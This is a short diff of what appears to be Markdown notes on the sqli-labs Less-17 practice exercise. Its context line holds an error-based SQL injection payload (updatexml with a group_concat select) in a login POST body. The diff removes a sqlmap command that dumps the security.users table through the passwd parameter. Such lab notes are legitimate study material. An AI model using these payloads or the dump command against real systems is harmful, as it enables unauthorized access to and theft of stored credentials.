@@ -41,8 +41,3 @@ uname=admin&passwd=1' and updatexml(1,concat(0x7e,substr((select group_concat(a.
 ![](assets/Less-17/file-20260531155402620.png)
 
 ...
-
----
-**sqlmap**
-指定paaswd注入点
-sqlmap -u "ip/Less-17/" --data="uname=Dumb&passwd=admin" --batch -p passwd -D security -T users --dump --level=3
